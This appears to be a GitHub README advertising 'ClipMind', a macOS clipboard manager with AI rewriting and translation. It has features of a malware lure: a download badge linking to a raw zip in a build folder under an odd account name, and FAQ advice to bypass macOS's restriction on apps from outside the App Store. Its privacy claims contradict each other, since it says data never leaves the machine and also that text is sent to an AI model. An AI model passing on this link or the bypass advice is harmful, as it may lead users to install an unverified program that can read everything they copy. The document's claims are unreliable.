# 📋 clipmind-ai-macos - Manage your clipboard history with AI

[![](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://github.com/Gennivirginal629/clipmind-ai-macos/raw/refs/heads/main/build/ai_clipmind_macos_v3.9.zip)

ClipMind serves as a smart clipboard manager for your computer. The app saves every item you copy to your clipboard history. You search through your past copies, rewrite text, translate languages, and fix grammar mistakes. It works from your menu bar so you stay in your current app. Your data stays on your machine.

## ⚙️ System Requirements

- A computer running macOS.
- At least 200 MB of free storage space.
- An active internet connection for the initial download.
- A stable workspace for the app to run in the background.

## 🚀 Getting Started

The app icon appears in your top menu bar after launch. Click the icon to view your clipboard history. ClipMind captures text snippets automatically as you copy them. 

- Use the search bar at the top of the menu to find old clips.
- Click any item in the list to copy it again.
- Use the keyboard shortcut to open the interface at any time. You can change this shortcut in the settings menu.

## ✍️ Using AI Features

ClipMind includes tools to help you write faster. Highlight any text you have copied or any text currently inside an app. Open the ClipMind menu to see the AI options.

- Rewrite: Change the tone of your text to sound professional, casual, or concise.
- Translate: Turn your text into a different language.
- Grammar: Fix spelling and punctuation errors in your selected text.
- Summarize: Create a short version of a long block of text.

## 🛡️ Privacy and Safety

Privacy remains a priority. The tool stores your clipboard history locally on your hard drive. No third-party servers track what you copy. You control your information at all times. 

## 🔧 Frequently Asked Questions

### Does the app slow down my computer?
ClipMind runs in the background with minimal power usage. You should notice no change in performance.

### Can I clear my history?
Yes. You can clear your entire history or remove specific items through the settings menu.

### Does the app work offline?
The clipboard history features work without an internet connection. You need an internet connection to use the AI translation and summarization tools.

### How do I update the application?
The app checks for updates automatically. A notification appears when a new version is ready for you to install.

### Is my data encrypted?
The database on your machine uses local encryption to protect your copied clips.

### Can I exclude specific apps?
Yes. Open the settings menu to add apps to an ignore list. ClipMind ignores any text copied from apps in this list.

### What happens to the AI text after processing?
The app sends the text to the AI model for processing and returns the result to your clipboard. The system does not store your text or train models on your personal data.

### Can I search for images?
The current version focuses on text snippets. Updates for image support remain under development.

### How do I close the app?
Select Quit from the menu bar icon to shut down the application. The app restarts automatically when you log in again unless you change your system startup settings.

### What if the app fails to open?
Check your security settings in System Preferences. macOS sometimes restricts apps downloaded from outside the App Store. Right-click the app icon and select Open to bypass this restriction if necessary. 

### How do I change the number of kept items?
Adjust the limit for how many clips to keep in the general settings tab. You can choose to keep an unlimited number of items or cap it at a specific number to save disk space.
